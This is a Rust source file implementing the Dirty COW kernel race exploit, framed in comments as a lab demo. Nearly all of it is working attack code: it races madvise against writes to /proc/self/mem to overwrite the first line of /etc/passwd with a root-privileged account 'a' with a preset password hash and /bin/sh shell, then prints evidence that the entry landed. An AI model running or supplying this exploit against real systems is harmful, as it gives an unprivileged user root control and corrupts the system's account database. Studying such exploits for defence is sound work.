use std::fs::{File, OpenOptions};
use std::io::{BufRead, BufReader, Seek, SeekFrom, Write};
use std::os::unix::io::AsRawFd;
use std::process::Command;
use std::ptr;
use std::sync::{
    Arc,
    atomic::{AtomicBool, Ordering},
};
use std::thread;
use std::time::{Duration, Instant};

const TARGET_PATH: &str = "/etc/passwd";
const LOGIN_NAME: &str = "a";

// The deliberately tiny passwd entry used by the lab.
// a(1) + :(1) + hash(13) + :0:0:.(6) + :/ (2) + :/bin/sh(7) + \n(1) = 32
const PAYLOAD: &str = "a:aafKPWZb/dLAs:0:0:.:/:/bin/sh\n";
const RACE_TIMEOUT: Duration = Duration::from_secs(10);
const PAGE_SIZE: usize = 4096;

fn main() -> std::io::Result<()> {
    let payload = PAYLOAD.as_bytes().to_vec();
    assert_eq!(
        payload.len(),
        32,
        "geometry fail: payload must be exactly 32 bytes"
    );

    let file = OpenOptions::new().read(true).open(TARGET_PATH)?;
    let map = unsafe {
        libc::mmap(
            ptr::null_mut(),
            PAGE_SIZE,
            libc::PROT_READ,
            libc::MAP_PRIVATE,
            file.as_raw_fd(),
            0,
        )
    };

    if map == libc::MAP_FAILED {
        return Err(std::io::Error::last_os_error());
    }

    println!("[*] whynot: Dirty COW lab race");
    println!("[*] target: {TARGET_PATH}");
    println!("[*] payload bytes: {}", payload.len());

    let running_madvise = Arc::new(AtomicBool::new(true));
    let running_write = Arc::new(AtomicBool::new(true));
    let map_usize = map as usize;

    // Thread 1: keep asking the kernel to drop the private mapping.
    let r1 = running_madvise.clone();
    let h1 = thread::spawn(move || {
        while r1.load(Ordering::SeqCst) {
            unsafe {
                libc::madvise(
                    map_usize as *mut libc::c_void,
                    PAGE_SIZE,
                    libc::MADV_DONTNEED,
                );
            }
            thread::yield_now();
        }
    });

    // Thread 2: write into our own mapped memory via /proc/self/mem.
    let r2 = running_write.clone();
    let writer_payload = payload.clone();
    let h2 = thread::spawn(move || {
        if let Ok(mut mem_file) = OpenOptions::new()
            .read(true)
            .write(true)
            .open("/proc/self/mem")
        {
            while r2.load(Ordering::SeqCst) {
                let _ = mem_file.seek(SeekFrom::Start(map_usize as u64));
                let _ = mem_file.write_all(&writer_payload);
                thread::yield_now();
            }
        }
    });

    let start = Instant::now();
    let mut landed = false;

    // Watch the first passwd line and stop the race as soon as the exact bytes land.
    loop {
        if start.elapsed() > RACE_TIMEOUT {
            println!("\n[-] Timeout. Race did not land.");
            break;
        }

        let mut check_line = String::new();
        if let Ok(f) = File::open(TARGET_PATH) {
            let _ = BufReader::new(f).read_line(&mut check_line);
        }

        if check_line == PAYLOAD {
            println!("\n[+] MATCH! Entry landed in {:?}", start.elapsed());
            landed = true;
            break;
        }
        thread::sleep(Duration::from_millis(5));
    }

    running_madvise.store(false, Ordering::SeqCst);
    running_write.store(false, Ordering::SeqCst);
    let _ = h1.join();
    let _ = h2.join();

    unsafe {
        libc::munmap(map, 4096);
    }

    if !landed {
        return Ok(());
    }

    // Let the dust settle, then print enough evidence for the demo transcript.
    thread::sleep(Duration::from_millis(500));

    println!("\n[*] --- DIAGNOSTICS ---");
    println!("[*] First line:");
    let _ = Command::new("head")
        .arg("-n")
        .arg("1")
        .arg(TARGET_PATH)
        .status();

    println!("[*] getent passwd {LOGIN_NAME}:");
    let _ = Command::new("getent")
        .arg("passwd")
        .arg(LOGIN_NAME)
        .status();
    println!("[*] -------------------\n");

    Ok(())
}
